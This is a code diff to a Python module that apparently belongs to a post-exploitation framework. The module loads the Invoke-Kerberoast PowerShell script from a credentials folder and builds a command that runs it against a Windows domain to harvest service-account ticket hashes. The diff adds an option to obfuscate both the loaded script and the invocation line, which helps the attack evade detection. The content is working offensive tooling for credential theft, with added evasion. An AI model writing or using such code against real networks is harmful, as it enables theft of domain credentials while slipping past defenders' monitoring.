@@ -92,13 +92,15 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         moduleName = self.info['Name']
         
         # read in the common powerview.ps1 module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Kerberoast.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -109,17 +111,19 @@ class Module:
         f.close()
 
         script = moduleCode
-        script += "\nInvoke-Kerberoast "
+        scriptEnd = "\nInvoke-Kerberoast "
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
                         # if we're just adding a switch
-                        script += " -" + str(option)
+                        scriptEnd += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
+                        scriptEnd += " -" + str(option) + " " + str(values['Value']) 
 
-        script += '| fl | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
-
+        scriptEnd += '| fl | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
